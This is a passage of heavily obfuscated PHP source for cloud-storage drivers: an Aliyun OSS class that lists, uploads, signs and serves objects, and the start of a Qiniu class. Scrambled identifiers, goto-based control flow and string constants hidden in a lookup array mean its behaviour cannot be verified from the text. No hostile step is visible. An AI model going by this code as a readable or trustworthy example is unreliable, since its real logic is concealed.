$d¬éÏ³»Š = false, $c÷Ê´‡ÌÚÁ = true) { goto BÉ‘‡ƒ³”„; BÉ‘‡ƒ³”„: $b¡çŸ‰Ö»‰ =& $_SERVER[´¬]; $aö‹Ò†ä ˆ = trim($aö‹Ò†ä ˆ, $b¡çŸ‰Ö»‰[8]); $D³¸Ş±º” = empty($aö‹Ò†ä ˆ) ? $b¡çŸ‰Ö»‰[33] : $aö‹Ò†ä ˆ . $b¡çŸ‰Ö»‰[8]; goto AºèÁğˆ“ã; AºèÁğˆ“ã: $a¿¸ÅØ®Ã‹ = $b¡çŸ‰Ö»‰[33]; $BÛˆ—âŞœ = 500; $EØŸÒ = $aÇ¢õ¨¸± = 0; goto C½¥‹Ñ¥‰±; C½¥‹Ñ¥‰±: while (!0) { check_abort(); $dö©Ì‚Ø®ö = array($b¡çŸ‰Ö»‰[1271] => $b¡çŸ‰Ö»‰[8], $b¡çŸ‰Ö»‰[1272] => $D³¸Ş±º”, $b¡çŸ‰Ö»‰[1273] => $BÛˆ—âŞœ, $b¡çŸ‰Ö»‰[1274] => $a¿¸ÅØ®Ã‹); try { $CÊ¥ÀŠ = $this->client->listObjects($this->bucket, $dö©Ì‚Ø®ö); } catch (OSS\Core\OssException $fÆ“÷˜ÖŠê) { break; } $a¿¸ÅØ®Ã‹ = $CÊ¥ÀŠ->getNextMarker(); $fĞğŸœøµ  = $CÊ¥ÀŠ->getObjectList(); $A¬ÀßÕÄºÄ = $CÊ¥ÀŠ->getPrefixList(); if ($d¬éÏ³»Š) { if (count($fĞğŸœøµ ) > 1 || count($fĞğŸœøµ ) == 1 && $fĞğŸœøµ [0]->getKey() != $D³¸Ş±º”) { $EØŸÒ += count($fĞğŸœøµ ) - 1; } if (!empty($A¬ÀßÕÄºÄ)) { $aÇ¢õ¨¸± += count($A¬ÀßÕÄºÄ); } if ($a¿¸ÅØ®Ã‹ === $b¡çŸ‰Ö»‰[33]) { break; } continue; } if ($c÷Ê´‡ÌÚÁ) { if (!empty($fĞğŸœøµ )) { if (count($fĞğŸœøµ ) > 1 || $fĞğŸœøµ [0]->getKey() != $D³¸Ş±º”) { return !0; } } } else { if (!empty($A¬ÀßÕÄºÄ)) { return !0; } } if ($a¿¸ÅØ®Ã‹ === $b¡çŸ‰Ö»‰[33]) { break; } } if ($d¬éÏ³»Š) { return array($b¡çŸ‰Ö»‰[202] => $EØŸÒ, $b¡çŸ‰Ö»‰[203] => $aÇ¢õ¨¸±); } return !1; goto c‡‚áçğÖ; c‡‚áçğÖ: } public function listAll($E´„ªº”Ëé) { $dÁñŒÅ†ö =& $_SERVER[´¬]; $cÑï‘Ü¸È = $this->fileList($E´„ªº”Ëé, $dÁñŒÅ†ö[33], !0); $CÈª—–ÈÉ• = array(); foreach ($cÑï‘Ü¸È[$dÁñŒÅ†ö[74]] as $e„®ëÈÑ±·) { $CÈª—–ÈÉ•[$e„®ëÈÑ±·[$dÁñŒÅ†ö[28]]] = $e„®ëÈÑ±·[$dÁñŒÅ†ö[78]]; } foreach ($cÑï‘Ü¸È[$dÁñŒÅ†ö[75]] as $e„®ëÈÑ±·) { if (is_string($e„®ëÈÑ±·)) { $CÈª—–ÈÉ•[$e„®ëÈÑ±·] = 0; } } return $this->listAllFiles($E´„ªº”Ëé, array_keys($CÈª—–ÈÉ•), $CÈª—–ÈÉ•); } public function canRead($BõµÎó»µµ) { $BˆÍÃ¹Í±¹ =& $_SERVER[´¬]; $b¬ØˆÛĞøä = $this->pathAcl($BõµÎó»µµ); return $b¬ØˆÛĞøä == $BˆÍÃ¹Í±¹[1285] || $b¬ØˆÛĞøä == $BˆÍÃ¹Í±¹[518] ? !0 : !1; } public function canWrite($F§ä¹ë¼) { $eí»ÌåØ¸¢ = $this->pathAcl($F§ä¹ë¼); return $eí»ÌåØ¸¢ == $_SERVER[´¬][518] ? !0 : !1; } public function pathAcl($eß“ÏÜìƒÚ) { goto FŒ£Ïƒ¹¾‹; Bà¿²§Æ¿¬: return $BèçÕæÌìÌ; goto dƒíùé¯¥•; d“ğÄÜµ©: $BèçÕæÌìÌ = $fƒ·•‚Ğ¥Â == $dØ×Õ‰ïö[34] ? $this->bucketAcl : $fƒ·•‚Ğ¥Â; if ($BèçÕæÌìÌ == $dØ×Õ‰ïö[1286]) { return $dØ×Õ‰ïö[1285]; } if ($BèçÕæÌìÌ == $dØ×Õ‰ïö[1287]) { return $dØ×Õ‰ïö[518]; } goto Bà¿²§Æ¿¬; FŒ£Ïƒ¹¾‹: $dØ×Õ‰ïö =& $_SERVER[´¬]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $fƒ·•‚Ğ¥Â = $this->client->getObjectAcl($this->bucket, $this->pathEncode($eß“ÏÜìƒÚ)); } catch (OSS\Core\OssException $f·ô¡¦½í) { return !1; } goto d“ğÄÜµ©; dƒíùé¯¥•: } private function chmodPath($DÈÙÙ©îœÊ, $b°Ì‚Ô‡¥ = '') { $e˜õÇ¨Ô÷ñ =& $_SERVER[´¬]; $C„òÂ“¨Ä’ = empty($b°Ì‚Ô‡¥) ? $e˜õÇ¨Ô÷ñ[1287] : $b°Ì‚Ô‡¥; $DšÉšº·¥ô = array($e˜õÇ¨Ô÷ñ[34], $e˜õÇ¨Ô÷ñ[191], $e˜õÇ¨Ô÷ñ[1286], $e˜õÇ¨Ô÷ñ[1287]); if (!in_array($C„òÂ“¨Ä’, $DšÉšº·¥ô)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($DÈÙÙ©îœÊ), $C„òÂ“¨Ä’); } catch (OSS\Core\OssException $c„ÚÅÏÙ‡Ã) { return !1; } return !0; } public function getContent($eØŒÉÙï÷) { return $this->fileSubstr($eØŒÉÙï÷, -1); } public function setContent($b¬„ÁÉ¢¼Î, $båö¢ÂíŞ = '') { $D—›©ñ±â =& $_SERVER[´¬]; try { $AÖ¦Ö…î‚å = $this->trafficLimit($D—›©ñ±â[1288]); $Cõ†™¤·“§ = $this->client->putObject($this->bucket, $this->pathEncode($b¬„ÁÉ¢¼Î), $båö¢ÂíŞ, $AÖ¦Ö…î‚å); } catch (OSS\Core\OssException $b‰ƒ°´Ğ‡Ò) { return !1; } $EĞ»ãÖ±á³ = array($D—›©ñ±â[1277] => trim($Cõ†™¤·“§[$D—›©ñ±â[1289]], $D—›©ñ±â[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($b¬„ÁÉ¢¼Î))); $this->updateObjMeta($b¬„ÁÉ¢¼Î, $EĞ»ãÖ±á³); return isset($Cõ†™¤·“§[$D—›©ñ±â[1290]][$D—›©ñ±â[1236]]) ? !0 : !1; } private function updateObjMeta($bèƒª£í¦², $C¾©•àÁ) { $bèƒª£í¦² = $this->pathEncode($bèƒª£í¦²); try { $BºêÛŠ†ãÏ = array(OSS\OssClient::OSS_HEADERS => $C¾©•àÁ); $this->client->copyObject($this->bucket, $bèƒª£í¦², $this->bucket, $bèƒª£í¦², $BºêÛŠ†ãÏ); } catch (OSS\Core\OssException $EÍ¤¹­†£¾) { return !1; } return !0; } public function upload($bìŒ™˜°§, $Bçäñ§œÇ, $D†ù¯¦£¡ = false, $dš¤å®¤–İ = REPEAT_REPLACE) { $AªÜ¦Û„ù =& $_SERVER[´¬]; $aÈØò¸½ù = trim($bìŒ™˜°§, $AªÜ¦Û„ù[8]); $a…ÖèïÁ¿½ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($AªÜ¦Û„ù[1277] => @md5_file($Bçäñ§œÇ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($bìŒ™˜°§))); $a…ÖèïÁ¿½ = $this->trafficLimit($AªÜ¦Û„ù[1288], $a…ÖèïÁ¿½); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($aÈØò¸½ù), $Bçäñ§œÇ, $a…ÖèïÁ¿½); } catch (OSS\Core\OssException $a‚‚¸öñÑÀ) { return !1; } return $this->getPathOuter($bìŒ™˜°§); } public function getHost() { $C®„ÊİğÄ» =& $_SERVER[´¬]; $aã††Ó™´ = explode($C®„ÊİğÄ»[177], parent::getHost()); return $aã††Ó™´[0] . $C®„ÊİğÄ»[177] . $this->bucket . $C®„ÊİğÄ»[95] . $aã††Ó™´[1]; } public function uploadFormData($e¿Øã¼Ù™å, $BÅ¾òõôç× = 3600) { goto AäíÛœéŒ¸; añÍŠ»£¾œ: $eÉ‡»¤À“ã = date($aá••¾ÕÁå[1291], time() + $BÙÃ”¼Ü†); $Bõ£ÓŞÍæ = new DateTime($eÉ‡»¤À“ã); $a½ÒÊ¯µ‡ï = $Bõ£ÓŞÍæ->format(DateTime::ISO8601); goto aËÌÛªòÉ§; a©š¹ğç: $FÆ–©ÛÛ²ó = base64_encode(hash_hmac($aá••¾ÕÁå[229], $cÆÚ‰ßàÇ•, $this->secret, !0)); $AßÒ²ô£´ô = array($aá••¾ÕÁå[1201] => $cÆÚ‰ßàÇ•, $aá••¾ÕÁå[1294] => $this->accessKey, $aá••¾ÕÁå[1197] => $aá••¾ÕÁå[1189], $aá••¾ÕÁå[1295] => $FÆ–©ÛÛ²ó, $aá••¾ÕÁå[175] => $eÇÚâƒ¤); $AßÒ²ô£´ô = $this->trafficLimit($aá••¾ÕÁå[1288], $AßÒ²ô£´ô); goto aÏø¼íÓ; aËÌÛªòÉ§: $B¬Û·ñ‹Ï­ = strpos($a½ÒÊ¯µ‡ï, $aá••¾ÕÁå[293]); $a½ÒÊ¯µ‡ï = substr($a½ÒÊ¯µ‡ï, 0, $B¬Û·ñ‹Ï­) . $aá••¾ÕÁå[1292]; $f†ˆ—’­÷ = 1048576000 * 5; goto A±óçÍç; AäíÛœéŒ¸: $aá••¾ÕÁå =& $_SERVER[´¬]; if (!($eÇÚâƒ¤ = $this->getHost())) { return !1; } $BÙÃ”¼Ü† = $BÅ¾òõôç×; goto añÍŠ»£¾œ; A±óçÍç: $FøÙâ©ƒßí = $this->pathFather($e¿Øã¼Ù™å); $DÖÖÎ„Š = array($aá••¾ÕÁå[1191] => $a½ÒÊ¯µ‡ï, $aá••¾ÕÁå[1192] => array(array($aá••¾ÕÁå[1293], 0, $f†ˆ—’­÷), array($aá••¾ÕÁå[1195], $aá••¾ÕÁå[1196], $FøÙâ©ƒßí))); $cÆÚ‰ßàÇ• = base64_encode(json_encode($DÖÖÎ„Š)); goto a©š¹ğç; aÏø¼íÓ: return $AßÒ²ô£´ô; goto c«Ûáš·ßç; c«Ûáš·ßç: } public function multiUploadFormData($d™¶‚ÆŞÈ, $cç åµ“© = 3600) { $fø‚¾¯©Ú° =& $_SERVER[´¬]; if (!($AÙ†Ÿó…¯ë = $this->getHost())) { return !1; } $b³÷ï‡Ê = $this->trafficLimit($fø‚¾¯©Ú°[1288]); $dÄÏçÙÍ±Ê = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($d™¶‚ÆŞÈ), $b³÷ï‡Ê); return array($fø‚¾¯©Ú°[220] => $dÄÏçÙÍ±Ê, $fø‚¾¯©Ú°[175] => $AÙ†Ÿó…¯ë . $fø‚¾¯©Ú°[8] . $this->pathEncode($d™¶‚ÆŞÈ), $fø‚¾¯©Ú°[221] => gmdate($fø‚¾¯©Ú°[1296]), $fø‚¾¯©Ú°[93] => $d™¶‚ÆŞÈ); } public function multiUploadAuthData($B“À±ëÀš , $B‡Í…ë‡¡ã = array()) { goto a‚Î˜â›Ò¾; Eâß¨²ì±: $FÃàÎŒåõ = array($Dî¼ÊÍ…[223], $Dî¼ÊÍ…[33], $Dî¼ÊÍ…[119], $F““Ğ©ƒ’, "\x78\x2d\157\163\163\x2d\x64\141\164\x65\x3a{$F““Ğ©ƒ’}", $Dî¼ÊÍ…[8] . $this->bucket . $Dî¼ÊÍ…[8] . $F’ÔÙ£· . $Däê¸³‚”); if (strpos($Däê¸³‚”, $Dî¼ÊÍ…[224]) === 0) { $FÃàÎŒåõ[0] = $Dî¼ÊÍ…[225]; if ($E÷¶îŞÖ˜ = $this->trafficLimit($Dî¼ÊÍ…[1288])) { $F’ÔÙ£· = $Dî¼ÊÍ…[1297]; array_splice($FÃàÎŒåõ, 5, 0, $F’ÔÙ£· . $Dî¼ÊÍ…[4] . $E÷¶îŞÖ˜[$F’ÔÙ£·]); } } if (isset($B‡Í…ë‡¡ã[$Dî¼ÊÍ…[226]]) && $B‡Í…ë‡¡ã[$Dî¼ÊÍ…[226]] == $Dî¼ÊÍ…[227]) { $FÃàÎŒåõ[0] = $Dî¼ÊÍ…[227]; } goto E”ôŸ¾ÉÖƒ; bò›•„¢š: $BÙ»´Ç†´¿ = $Dî¼ÊÍ…[1261] . $this->accessKey . $Dî¼ÊÍ…[4] . $C§×ÎÂÊ‘; if (strpos($Däê¸³‚”, $Dî¼ÊÍ…[224]) === 0) { $BÙ»´Ç†´¿ = array($Dî¼ÊÍ…[231] => $BÙ»´Ç†´¿, $Dî¼ÊÍ…[221] => $F““Ğ©ƒ’); if ($E÷¶îŞÖ˜) { $BÙ»´Ç†´¿ = array_merge($BÙ»´Ç†´¿, $E÷¶îŞÖ˜); } } return $BÙ»´Ç†´¿; goto FÊÚ’Ó“†‘; a‚Î˜â›Ò¾: $Dî¼ÊÍ… =& $_SERVER[´¬]; $F““Ğ©ƒ’ = isset($B‡Í…ë‡¡ã[$Dî¼ÊÍ…[221]]) ? $B‡Í…ë‡¡ã[$Dî¼ÊÍ…[221]] : gmdate($Dî¼ÊÍ…[1296]); $Däê¸³‚” = isset($B‡Í…ë‡¡ã[$Dî¼ÊÍ…[168]]) ? $B‡Í…ë‡¡ã[$Dî¼ÊÍ…[168]] : $Dî¼ÊÍ…[33]; goto A‘‚ç¬ê‰; A‘‚ç¬ê‰: $F’ÔÙ£· = $B“À±ëÀš ; if (isset($B‡Í…ë‡¡ã[$Dî¼ÊÍ…[93]])) { $F’ÔÙ£· = $B‡Í…ë‡¡ã[$Dî¼ÊÍ…[93]]; unset($B‡Í…ë‡¡ã[$Dî¼ÊÍ…[93]]); } if (isset($B‡Í…ë‡¡ã[$Dî¼ÊÍ…[222]])) { $B‡Í…ë‡¡ã[$Dî¼ÊÍ…[221]] = $F““Ğ©ƒ’; return $this->listUploadParts($F’ÔÙ£·, $B‡Í…ë‡¡ã); } goto Eâß¨²ì±; E”ôŸ¾ÉÖƒ: if (!empty($B‡Í…ë‡¡ã[$Dî¼ÊÍ…[1298]])) { $d¼¹µ¶ò´ = array_merge(array($FÃàÎŒåõ[4]), $B‡Í…ë‡¡ã[$Dî¼ÊÍ…[1298]]); sort($d¼¹µ¶ò´); $FÃàÎŒåõ[4] = implode($Dî¼ÊÍ…[228], $d¼¹µ¶ò´); } $Fâë¾ªóö± = implode($Dî¼ÊÍ…[228], $FÃàÎŒåõ); $C§×ÎÂÊ‘ = base64_encode(hash_hmac($Dî¼ÊÍ…[229], $Fâë¾ªóö±, $this->secret, !0)); goto bò›•„¢š; FÊÚ’Ó“†‘: } public function listUploadParts($AÊ‘ÕîÃÒ, $eø„½ùÓó) { goto aëó—”ã·Á; aëó—”ã·Á: $B†˜£İØ¯ï =& $_SERVER[´¬]; $C–À³¢…ß’ = parse_url_query($eø„½ùÓó[$B†˜£İØ¯ï[168]]); $a®®äÊ¨Š³ = $this->client->listParts($this->bucket, $this->pathEncode($AÊ‘ÕîÃÒ), $C–À³¢…ß’[$B†˜£İØ¯ï[220]]); goto F´’•¥ö®Ğ; aÕèì«Û‰ô: return array($B†˜£İØ¯ï[231] => $E…ºáåßÁ, $B†˜£İØ¯ï[221] => $eø„½ùÓó[$B†˜£İØ¯ï[221]], $B†˜£İØ¯ï[233] => $C‘Ò—ì¶Şæ); goto B¸‚´Á£‚»; F´’•¥ö®Ğ: $fç¯×ÖŸ‰ˆ = $a®®äÊ¨Š³->getListPart(); $C‘Ò—ì¶Şæ = array(); foreach ($fç¯×ÖŸ‰ˆ as $B§õÆî³©) { $C‘Ò—ì¶Şæ[] = array($B†˜£İØ¯ï[1281] => $B§õÆî³©->getPartNumber(), $B†˜£İØ¯ï[1282] => trim($B§õÆî³©->getETag(), $B†˜£İØ¯ï[116])); } goto A¢ÇŸ®âìÚ; A¢ÇŸ®âìÚ: unset($eø„½ùÓó[$B†˜£İØ¯ï[222]], $eø„½ùÓó[$B†˜£İØ¯ï[226]]); $E…ºáåßÁ = $this->multiUploadAuthData($AÊ‘ÕîÃÒ, $eø„½ùÓó); if (empty($E…ºáåßÁ)) { return !1; } goto aÕèì«Û‰ô; B¸‚´Á£‚»: } public function download($Aâƒ˜î²¡¬, $BÊ¡Î¶›èÏ) { if ($this->isFolder($Aâƒ˜î²¡¬)) { return !1; } try { $bÎåÃôå±› = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $BÊ¡Î¶›èÏ); $bÎåÃôå±› = $this->trafficLimit($_SERVER[´¬][109], $bÎåÃôå±›); $this->client->getObject($this->bucket, $this->pathEncode($Aâƒ˜î²¡¬), $bÎåÃôå±›); } catch (OSS\Core\OssException $BŸ¿Ê²ˆğ) { return !1; } return $BÊ¡Î¶›èÏ; } public function fileSubstr($fÚ–É‹ö™, $Dµ¢åÁ›† = 0, $EŸ÷éáÒ£¼ = false) { if ($Dµ¢åÁ›† === -1) { $B×¸©ÇğË = array(); } else { if ($EŸ÷éáÒ£¼ === !1) { $b¬Èµ¬‰¶ó = $this->size($fÚ–É‹ö™); } else { $b¬Èµ¬‰¶ó = $Dµ¢åÁ›† + $EŸ÷éáÒ£¼ - 1; } $B×¸©ÇğË = array(OSS\OssClient::OSS_RANGE => "{$Dµ¢åÁ›†}\55{$b¬Èµ¬‰¶ó}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($fÚ–É‹ö™), $B×¸©ÇğË); } catch (OSS\Core\OssException $AŠ‚öôïò) { think_exception($AŠ‚öôïò->getMessage()); return !1; } } private function trafficLimit($CØÑ¬ÏÚìº, $E¥¾†Ñ•Ò› = array()) { goto cÀ˜êî›; dìî†Ä²˜¨: if (!$dï¦…öøÙÁ) { return $E¥¾†Ñ•Ò›; } $dï¦…öøÙÁ = $dï¦…öøÙÁ < 819200 ? 819200 : ($dï¦…öøÙÁ > 838860800 ? 838860800 : $dï¦…öøÙÁ); $E¥¾†Ñ•Ò›[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($dï¦…öøÙÁ); goto BòèæˆÑ÷; BòèæˆÑ÷: return $E¥¾†Ñ•Ò›; goto EÎ”¸¤Ğ—›; cÀ˜êî›: $fñ«…´îÙ =& $_SERVER[´¬]; if ($CØÑ¬ÏÚìº == $fñ«…´îÙ[1288] && $this->isUploadServer() || $CØÑ¬ÏÚìº == $fñ«…´îÙ[109] && $this->isFileOutServer()) { return $E¥¾†Ñ•Ò›; } $dï¦…öøÙÁ = floatval($GLOBALS[$fñ«…´îÙ[6]][$fñ«…´îÙ[88]][$fñ«…´îÙ[107]][$CØÑ¬ÏÚìº]) * 1024 * 1024 * 8; goto dìî†Ä²˜¨; EÎ”¸¤Ğ—›: } public function link($aááåß™Ø‚, $f÷Á¹Şò­Ù = array()) { $Aò¨ÇÚì–Ó =& $_SERVER[´¬]; if (!$this->exist($aááåß™Ø‚) || $this->isFolder($aááåß™Ø‚)) { return !1; } try { $f÷Á¹Şò­Ù = $this->trafficLimit($Aò¨ÇÚì–Ó[109], $f÷Á¹Şò­Ù); $E‹ö×Ğ‚… = $this->client->signUrl($this->bucket, $this->pathEncode($aááåß™Ø‚), 3600 * 12, $Aò¨ÇÚì–Ó[227], $f÷Á¹Şò­Ù); return $this->getCdnLink($E‹ö×Ğ‚…); } catch (OSS\Core\OssException $F¶Š¸ÆˆË) { return !1; } } public function fileOut($Fµµ®ÅåÏ¨, $EŠ©Ğ¢¶¥Œ = false, $E¢™¹æòØå = false, $F§ùŸŒ–æõ = '') { goto Aì»ˆùâ®¢; B‡£‰–Î°: $EŠ©Ğ¢¶¥Œ = $EŠ©Ğ¢¶¥Œ ? $dÂÜƒë¦¿[213] : $dÂÜƒë¦¿[214]; $aÆÄâáœ†Ê = array(OSS\OssClient::OSS_SUB_RESOURCE => $dÂÜƒë¦¿[1299] . rawurlencode("{$EŠ©Ğ¢¶¥Œ}\73\146\x69\154\x65\x6e\141\155\x65\75{$E¢™¹æòØå}")); $aÆÄâáœ†Ê[OSS\OssClient::OSS_SUB_RESOURCE] .= $dÂÜƒë¦¿[1300] . rawurlencode($EœæÍÊ†); goto dñ¼öî; fï×ÙôÇ˜µ: $E¢™¹æòØå = rawurlencode($E¢™¹æòØå); $EœæÍÊ† = get_file_mime(get_path_ext($E¢™¹æòØå)); if ($EœæÍÊ† == $dÂÜƒë¦¿[212]) { return parent::fileOut($Fµµ®ÅåÏ¨, $EŠ©Ğ¢¶¥Œ, $E¢™¹æòØå, $F§ùŸŒ–æõ); } goto B‡£‰–Î°; Aì»ˆùâ®¢: $dÂÜƒë¦¿ =& $_SERVER[´¬]; if ($this->isFileOutServer()) { return $this->fileOutServer($Fµµ®ÅåÏ¨, $EŠ©Ğ¢¶¥Œ, $E¢™¹æòØå, $F§ùŸŒ–æõ); } if (!$E¢™¹æòØå) { $E¢™¹æòØå = $this->pathThis($Fµµ®ÅåÏ¨); } goto fï×ÙôÇ˜µ; dñ¼öî: $E‹¸ëğÜï = $this->link($Fµµ®ÅåÏ¨, $aÆÄâáœ†Ê); $this->fileOutLink($E‹¸ëğÜï); goto A¹ñÉ‹ÙØÒ; A¹ñÉ‹ÙØÒ: } public function fileOutServer($B“ğí¢ÖÅº, $D¶Â„Ç¸ïº = false, $FÑ‚‰¹‹®¥ = false, $FïÂ»¼Ó±‚ = '') { parent::fileOut($B“ğí¢ÖÅº, $D¶Â„Ç¸ïº, $FÑ‚‰¹‹®¥, $FïÂ»¼Ó±‚); } public function fileOutImage($EµğˆÓ·‡², $Dõƒ˜åÂ²“ = 250) { $Aô•®¨ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[´¬][1301] . $Dõƒ˜åÂ²“); $BÃÀ‘¿Êà = $this->link($EµğˆÓ·‡², $Aô•®¨); $this->fileOutLink($BÃÀ‘¿Êà); } public function fileOutImageServer($FŒïáÕ·Ú, $F¡ÄåÂ¾‘ƒ = 250) { parent::fileOutImage($FŒïáÕ·Ú, $F¡ÄåÂ¾‘ƒ); } public function fileOutLink($A¸ï¤¬ÁÌ) { $Cƒ´å‹åÔÕ =& $_SERVER[´¬]; if (!$this->isCdnHost() && substr($A¸ï¤¬ÁÌ, 0, 7) == $Cƒ´å‹åÔÕ[1204]) { $A¸ï¤¬ÁÌ = $Cƒ´å‹åÔÕ[1205] . substr($A¸ï¤¬ÁÌ, 7); } header($Cƒ´å‹åÔÕ[159] . $A¸ï¤¬ÁÌ); die; } public function hashMd5($dÈ˜æôÇ—ß, $dÀ”†¥Í­õ = '') { $e¡‚ŸÇã¾í =& $_SERVER[´¬]; $b¼…®Ëˆ‚Û = $this->_objectMeta($dÈ˜æôÇ—ß); if (!$b¼…®Ëˆ‚Û) { return $e¡‚ŸÇã¾í[33]; } if (!isset($b¼…®Ëˆ‚Û[$e¡‚ŸÇã¾í[1277]]) && !empty($dÀ”†¥Í­õ)) { $DˆâÙ†ª…ò = $this->updateObjMeta($dÈ˜æôÇ—ß, array($e¡‚ŸÇã¾í[1277] => $dÀ”†¥Í­õ)); $b¼…®Ëˆ‚Û[$e¡‚ŸÇã¾í[1277]] = $DˆâÙ†ª…ò ? $dÀ”†¥Í­õ : $e¡‚ŸÇã¾í[33]; } return isset($b¼…®Ëˆ‚Û[$e¡‚ŸÇã¾í[1277]]) ? strtolower($b¼…®Ëˆ‚Û[$e¡‚ŸÇã¾í[1277]]) : $e¡‚ŸÇã¾í[33]; } public function size($Föİ’±Ó²) { $EÂˆÄ¡“’ = $this->objectMeta($Föİ’±Ó²); return $EÂˆÄ¡“’ ? $EÂˆÄ¡“’[$_SERVER[´¬][78]] : 0; } public function info($Cù½–™¯‚—) { if ($this->isFolder($Cù½–™¯‚—)) { return $this->folderInfo($Cù½–™¯‚—); } else { if ($this->isFile($Cù½–™¯‚—)) { return $this->fileInfo($Cù½–™¯‚—); } } return !1; } public function exist($BŸÅ¼†Ïº°) { return $this->isFile($BŸÅ¼†Ïº°) || $this->isFolder($BŸÅ¼†Ïº°); } public function isFile($Cµñò‰›À) { return !$this->isFolder($Cµñò‰›À) && $this->objectMeta($Cµñò‰›À); } public function isFolder($c®äÀğšµŠ) { return $this->cacheMethod($_SERVER[´¬][198], $c®äÀğšµŠ); } protected function objectMeta($e‰Ø÷ö’§‰) { return $this->cacheMethod($_SERVER[´¬][199], $e‰Ø÷ö’§‰); } protected function _objectMeta($C½¡±õ£ŠŠ) { $d÷´µØéê =& $_SERVER[´¬]; try { $cï¦ÍÃ´Ú³ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($C½¡±õ£ŠŠ)); } catch (OSS\Core\OssException $BáÓŒœŸâ) { $cï¦ÍÃ´Ú³ = !1; } if ($cï¦ÍÃ´Ú³) { $cï¦ÍÃ´Ú³[$d÷´µØéê[78]] = intval($cï¦ÍÃ´Ú³[$d÷´µØéê[1275]]); } return $cï¦ÍÃ´Ú³; } protected function _isFolder($F ¯Òøù•Ï) { $E‘‚ìçŠ©â =& $_SERVER[´¬]; if ($F ¯Òøù•Ï == $E‘‚ìçŠ©â[33] || $F ¯Òøù•Ï == $E‘‚ìçŠ©â[8]) { return !0; } $E•Äç†–ÀÖ = array($E‘‚ìçŠ©â[1271] => $E‘‚ìçŠ©â[8], $E‘‚ìçŠ©â[1272] => rtrim($F ¯Òøù•Ï, $E‘‚ìçŠ©â[8]) . $E‘‚ìçŠ©â[8], $E‘‚ìçŠ©â[1273] => 1, $E‘‚ìçŠ©â[1274] => $E‘‚ìçŠ©â[33]); $fÁ–•ˆ¼íâ = $this->client->listObjects($this->bucket, $E•Äç†–ÀÖ); if ($fÁ–•ˆ¼íâ->getObjectList() || $fÁ–•ˆ¼íâ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($A™®ÒÆÃ) { parent::__construct(); require_once SDK_DIR . $_SERVER[´¬][1302]; $this->_init($A™®ÒÆÃ); } public function _init($b¹¡™ì®¹õ) { goto A¿œ¹İ’; A¿œ¹İ’: $D¾ÑŸÉ‹ÇË =& $_SERVER[´¬]; foreach ($b¹¡™ì®¹õ as $D‘¡Í¡…š => $F¾…â·ÖÇ) { if (isset($this->{$D‘¡Í¡…š})) { $this->{$D‘¡Í¡…š} = $F¾…â·ÖÇ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($D¾ÑŸÉ‹ÇË[1303] . LNG($D¾ÑŸÉ‹ÇË[1262])); } goto A¹Ş²‰Ÿ„; CÄ˜­Û‘™: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto Añåá‡¿…; A¹Ş²‰Ÿ„: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto CÄ˜­Û‘™; Añåá‡¿…: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($a¢êò’’’, $cò®äœÂí = '', $c““èàÕ“Ä = REPEAT_RENAME) { if ($this->setContent($a¢êò’’’, $cò®äœÂí)) { return $this->getPathOuter($a¢êò’’’); } return !1; } public function mkdir($f„É ¤¤™â, $FÀİ×åİÏ = REPEAT_SKIP) { goto b½ªÌÀŸ¦·; cÌ„·Ô²¦: if (!$this->mkfile($BÅó¿èô†Í)) { return !1; } if (!$this->moveFile($BÅó¿èô†Í, $f„É ¤¤™â)) { $this->delFile($BÅó¿èô†Í); return !1; } return $this->getPathOuter($b¡á‡ö¹½); goto FÇ™Óİ–‹; b½ªÌÀŸ¦·: $b¸†—à‚ô =& $_SERVER[´¬]; $b¡á‡ö¹½ = trim($f„É ¤¤™â, $b¸†—à‚ô[8]); if ($this->_isFolder($b¡á‡ö¹½)) { return $this->getPathOuter($b¡á‡ö¹½); } goto c‰‡àÙ„ë•; c‰‡àÙ„ë•: $f„É ¤¤™â = $b¡á‡ö¹½ . $b¸†—à‚ô[8]; $cß‘—ÃÌ¢ = get_path_this($b¡á‡ö¹½); $BÅó¿èô†Í = $f„É ¤¤™â . $cß‘—ÃÌ¢; goto cÌ„·Ô²¦; FÇ™Óİ–‹: } public function copyFile($BÍ£ˆ‹Ëæ, $bÕ¦—øµ¿å) { $D¼ó„éİ‘„ = $this->bucketManager->copy($this->bucket, $BÍ£ˆ‹Ëæ, $this->bucket, $bÕ¦—øµ¿å, !0); return $D¼ó„éİ‘„ ? !1 : $this->getPathOuter($bÕ¦—øµ¿å); } public function moveFile($B…¿Æá¾ïì, $eÖ·„ë‰¤—) { $Dª¤¬š“ÂÕ = $this->bucketManager->move($this->bucket, $B…¿Æá¾ïì, $this->bucket, $eÖ·„ë‰¤—, !0); return $Dª¤¬š“ÂÕ ? !1 : $this->getPathOuter($eÖ·„ë‰¤—); } public function delFile($DºÅ–äÜØ) { if (!$this->exist($DºÅ–äÜØ)) { return !0; } $a—Ê¶™Ãğ = $this->bucketManager->delete($this->bucket, $DºÅ–äÜØ); return $a—Ê¶™Ãğ ? !1 : !0; } public function delFolder($Cõõ‰‰Ãõ¨) { goto D‘»àÊ­·; a—’ßİ†Ö : if 